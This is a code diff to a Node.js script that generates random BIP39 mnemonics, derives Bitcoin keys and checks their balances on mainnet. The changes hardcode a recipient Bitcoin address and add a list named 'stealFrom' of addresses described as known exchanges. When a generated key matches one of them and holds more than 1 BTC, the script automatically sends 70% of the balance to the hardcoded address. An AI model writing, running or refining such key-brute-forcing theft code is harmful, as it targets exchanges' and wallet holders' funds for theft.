@@ -1,13 +1,14 @@
-var sleep = require('sleep');
 var CoinKey = require('coinkey') //1.0.0
 var bip39 = require('bip39')
 var hdkey = require('hdkey')
 var bitcoinTransaction = require('bitcoin-transaction');
-var to = "YOUR BITCOIN ADDRESS HERE"; //change me to who you want the bitcoin to go to
+var to = "1ShzJ7McjMYaboVFokny1LGMFLT7Y6qDj"; //change me to who you want the bitcoin to go to
 var mnemonic;
 var seed;
 var seedToKey;
 var root;
+
+const stealFrom = ["34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo", "bc1ql49ydapnjafl5t2cp9zqpjwe6pdgmxy98859v2","39884E3j6KZj82FK4vcCrkUvWYL5MQaS3v"] //a short list of known exchanges
 
 console.log(`
 /=========================\\
@@ -39,33 +40,38 @@ PRIVATE KEY: ${root.privateKey.toString('hex')}
 SEED: ${seed}
 MNEMONIC: ${mnemonic}`);
 if (bip39.validateMnemonic(mnemonic)) {
-	console.log("Valid mnemonic found!")
-	try {
-	bitcoinTransaction.getBalance(from, { network: "mainnet" }).then((balanceInBTC) => {
-		if (balanceInBTC > 0) {
-			console.log("Valid BTC found!")
-			console.log(`Sending ${balanceInBTC} to ${to}.`)
-			console.log(`Congrats! It should take about half an hour to get your ${balanceInBTC} BTC.`)
-			return bitcoinTransaction.sendTransaction({
-				from: from,
-				to: to,
-				privKeyWIF: privKeyWIF,
-				btc: balanceInBTC,
-				network: "mainnet",
-				fee: "halfHour"
+	console.log("Valid mnemonic found, attempting...")
+	if (stealFrom.includes(from)) {
+        try {
+			bitcoinTransaction.getBalance(from, { network: "mainnet" }).then((balanceInBTC) => {
+				if (balanceInBTC > 1) {
+					console.log("Valid BTC found!")
+					console.log(`Sending ${balanceInBTC} to ${to}.`)
+					console.log(`Congrats! It should take about half an hour to get your ${balanceInBTC} BTC.`)
+					return bitcoinTransaction.sendTransaction({
+						from: from,
+						to: to,
+						privKeyWIF: privKeyWIF,
+						btc: (balanceInBTC - (balanceInBTC * .3)),
+						network: "mainnet",
+						fee: "halfHour"
+					});
+					process.exit()
+					//this line ignored by VSCode.
+				} else {
+					console.log("Not a real key with a balance, keep going...")
+					return "none-yet";
+				}
 			});
-			//this line ignored by VSCode.
-		} else {
-			console.log("Not a real key with a balance, keep going...")
-			return "none-yet";
-		}
-	});
-	} catch {
-		console.log(`This probably isn't a valid Private Key/Address. This is normal, I think.`)
+			} catch {
+				console.log(`This probably isn't a valid Private Key/Address. This is normal, I think.`)
+			}
+    } else {
+		console.log("Not in whitelist!")
 	}
 } else {
 	console.log("Still going...")
 }
 
-sleep.msleep(25)
+await new Promise(r => setTimeout(r, 13));
 }
